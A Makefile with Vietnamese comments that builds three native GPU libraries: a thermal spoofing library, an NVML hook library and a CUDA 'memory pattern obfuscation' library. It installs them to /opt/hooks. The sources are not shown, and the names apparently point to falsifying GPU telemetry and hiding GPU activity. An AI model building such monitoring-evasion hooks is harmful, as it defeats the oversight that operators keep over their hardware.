# GPU Native Components Makefile
# Biên dịch tất cả native GPU components

CC = gcc
NVCC = nvcc
CFLAGS = -Wall -Wextra -O2 -fPIC -shared
NVCCFLAGS = -O2 -shared -Xcompiler -fPIC -std=c++14

# Phát hiện kiến trúc CUDA
CUDA_ARCH = $(shell nvidia-smi --query-gpu=compute_cap --format=csv,noheader,nounits | head -1 | sed 's/\.//g')
ifeq ($(CUDA_ARCH),)
    CUDA_ARCH = 75  # Default cho RTX 2080/3080
endif

# Đường dẫn
THERMAL_DIR = thermal
NVML_DIR = nvml
CUDA_DIR = cuda

# Targets
all: thermal nvml cuda

thermal: $(THERMAL_DIR)/libtempspoof.so
nvml: $(NVML_DIR)/libgpuhook.so
cuda: $(CUDA_DIR)/libmpo.so

# Thermal spoofing library
$(THERMAL_DIR)/libtempspoof.so: $(THERMAL_DIR)/tempspoof.c
	@echo "Building thermal spoofing library..."
	$(CC) $(CFLAGS) -o $@ $< -ldl -lm
	@echo "✅ Built libtempspoof.so"

# NVML hook library
$(NVML_DIR)/libgpuhook.so: $(NVML_DIR)/gpuhook.c
	@echo "Building NVML hook library..."
	$(CC) $(CFLAGS) -o $@ $< -ldl -lm -lnvidia-ml
	@echo "✅ Built libgpuhook.so"

# CUDA Memory Pattern Obfuscation
$(CUDA_DIR)/libmpo.so: $(CUDA_DIR)/mpo_kernel.cu
	@echo "Building CUDA MPO library..."
	$(NVCC) $(NVCCFLAGS) -arch=sm_$(CUDA_ARCH) -o $@ $< -lcuda -lcudart
	@echo "✅ Built libmpo.so"

clean:
	rm -f $(THERMAL_DIR)/*.so $(NVML_DIR)/*.so $(CUDA_DIR)/*.so
	@echo "🧹 Cleaned all native libraries"

install: all
	@echo "Installing GPU native libraries..."
	mkdir -p /opt/hooks
	cp $(THERMAL_DIR)/libtempspoof.so /opt/hooks/
	cp $(NVML_DIR)/libgpuhook.so /opt/hooks/
	cp $(CUDA_DIR)/libmpo.so /opt/hooks/
	@echo "✅ Installed all GPU native libraries to /opt/hooks/"

# Kiểm tra dependencies
check-deps:
	@echo "Checking dependencies..."
	@which gcc > /dev/null || (echo "❌ GCC not found" && exit 1)
	@which nvcc > /dev/null || (echo "⚠️ NVCC not found - CUDA components will be skipped" && exit 0)
	@ldconfig -p | grep nvidia-ml > /dev/null || (echo "⚠️ NVIDIA ML library not found" && exit 0)
	@echo "✅ All dependencies OK"

.PHONY: all thermal nvml cuda clean install check-deps